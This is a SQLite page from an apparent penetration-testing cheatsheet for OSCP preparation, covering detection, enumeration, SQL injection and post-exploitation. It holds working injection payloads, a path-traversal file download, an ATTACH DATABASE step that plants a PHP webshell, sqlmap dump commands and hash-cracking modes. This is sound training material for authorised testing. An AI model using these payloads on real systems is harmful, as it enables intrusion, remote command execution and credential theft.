# SQLite

> Part of [Databases](./README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Exploitation](#3-exploitation)
- [4. Post-exploitation](#4-post-exploitation)
- [5. Common injection patterns](#5-common-injection-patterns)
- [6. OSCP notes](#6-oscp-notes)
- [7. References](#7-references)

---

## 1. Detection

### 1.1 No network port

SQLite is a **file-based** database. There is no port, no service, no banner. You only find it via:

- File discovery on the target filesystem (after foothold or LFI).
- Error messages from the web app mentioning `SQLite`, `sqlite3`, or `SQLITE_ERROR`.
- Response headers: `X-Powered-By: PHP` + error mentioning `PDO`.

### 1.2 File locations

Common paths:

| Path | Context |
|------|---------|
| `/var/www/html/*.db` | PHP apps |
| `/var/www/html/*.sqlite` | Django / Rails default |
| `/var/www/html/*.sqlite3` | Ruby / Python |
| `/opt/app/data/*.db` | Custom apps |
| `/home/*/.local/share/*/*.db` | User-level apps |
| `/tmp/*.db` | Temporary / cache |

### 1.3 Fingerprint via error

Trigger an error in the web app (`'`, `"`, `)`). Look for:

```text
SQLite3::query(): Unable to prepare statement: 1, near "..."
sqlite3.OperationalError: near "..."
SQLSTATE[HY000]: General error: 1 near "..."
```

### 1.4 File magic

SQLite files start with the ASCII header `SQLite format 3\0`.

```bash
# On the target (if you have shell)
file *.db
head -c 16 app.db | xxd

# From LFI or file-read primitive
# The first 16 bytes should be: 53 51 4c 69 74 65 20 66 6f 72 6d 61 74 20 33 00
```

---

## 2. Enumeration

### 2.1 Open the DB

```bash
sqlite3 app.db
```

### 2.2 List tables

```sql
.tables
```

Or via SQL:

```sql
SELECT name FROM sqlite_master WHERE type='table';
```

### 2.3 Dump schema

```sql
.schema
```

Or:

```sql
SELECT sql FROM sqlite_master WHERE type='table';
```

### 2.4 Find interesting columns

SQLite has no `information_schema`. Use `PRAGMA`:

```sql
PRAGMA table_info(users);
```

### 2.5 Read user data

```sql
SELECT * FROM users;
SELECT username, password FROM users;
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).
> The `.tables` and `SELECT * FROM users` output is the key evidence.

---

## 3. Exploitation

### 3.1 SQL injection in web apps (most common path)

Most SQLite access comes from SQL injection in a web app. SQLite syntax specifics:

| Feature | SQLite |
|---------|--------|
| Comments | `--`, `/* */` (no `#`) |
| String concat | `\|\|` |
| Substring | `substr(str, start, len)` |
| Version | `SELECT sqlite_version();` |
| Current DB | `SELECT name FROM sqlite_master WHERE type='table';` |
| Sleep | No `SLEEP()`. Use `randomblob(N)` for time-based |
| File read | None built-in |
| Stacked queries | Not supported in most drivers |

Time-based blind:

```sql
' OR 1=1 AND 1=(SELECT 1 FROM (SELECT 1,2,3 WHERE 1=1 AND (SELECT 1 FROM (SELECT COUNT(*),RANDOMBLOB(100000000))a)) LIMIT 1)-- -
```

### 3.2 Copy the DB (once you have shell)

```bash
# Copy to a readable location, then exfil
cp /var/www/html/app.db /tmp/app.db
# Or use LFI to read directly
curl 'http://<TARGET>/download?file=../../../var/www/html/app.db' -o app.db
```

### 3.3 ATTACH DATABASE (write primitive)

If SQLite is used by a web app with an injection, and `ATTACH` is not blocked, you can write files:

```sql
ATTACH DATABASE '/var/www/html/shell.php' AS shell;
CREATE TABLE shell.pwn (data text);
INSERT INTO shell.pwn VALUES ('<?php system($_GET[cmd]); ?>');
```

Then: `curl 'http://<TARGET>/shell.php?cmd=id'`

**Requires:** write permission to target dir + `ATTACH` not disabled.

---

## 4. Post-exploitation

### 4.1 Dump entire DB

```bash
sqlite3 app.db .dump > app.sql
```

### 4.2 Convert to CSV

```sql
.mode csv
.headers on
.output users.csv
SELECT * FROM users;
.output stdout
```

### 4.3 Find password hashes

```sql
SELECT * FROM users WHERE password IS NOT NULL;
```

Common formats:
- MD5 (32 hex) -> hashcat `-m 0`
- bcrypt (`$2y$...`) -> hashcat `-m 3200`
- Django PBKDF2 (`pbkdf2_sha256$...`) -> hashcat `-m 10000`

### 4.4 Reuse credentials

`users` table often has plaintext passwords or weakly hashed values used for SSH / admin panels.

---

## 5. Common injection patterns

### 5.1 UNION-based

SQLite requires matching column count. Determine with `ORDER BY`:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

Then UNION:

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT username,password,3 FROM users-- -
```

### 5.2 Extract schema via injection

```sql
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'-- -
```

### 5.3 Boolean-based blind

```sql
' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'-- -
```

### 5.4 sqlmap for SQLite

```bash
sqlmap -u "http://<TARGET>/page?id=1" --dbms=SQLite --dump
sqlmap -u "http://<TARGET>/page?id=1" --dbms=SQLite --tables
sqlmap -u "http://<TARGET>/page?id=1" --dbms=SQLite --sql-query="SELECT * FROM users"
```

---

## 6. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the `.tables` / `.schema` output that proves DB access.

> [!IMPORTANT]
> OSCP report: screenshot the SQL injection payload and its result (UNION dump of users table).

> [!IMPORTANT]
> OSCP report: screenshot any `ATTACH DATABASE` write primitive that yields a webshell.

---

## 7. References

- SQLite official docs: https://www.sqlite.org/docs.html
- HackTricks - SQLite injection: https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlite-injection
- PayloadsAllTheThings - SQLite: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
- sqlmap SQLite: https://github.com/sqlmapproject/sqlmap/wiki/Usage

---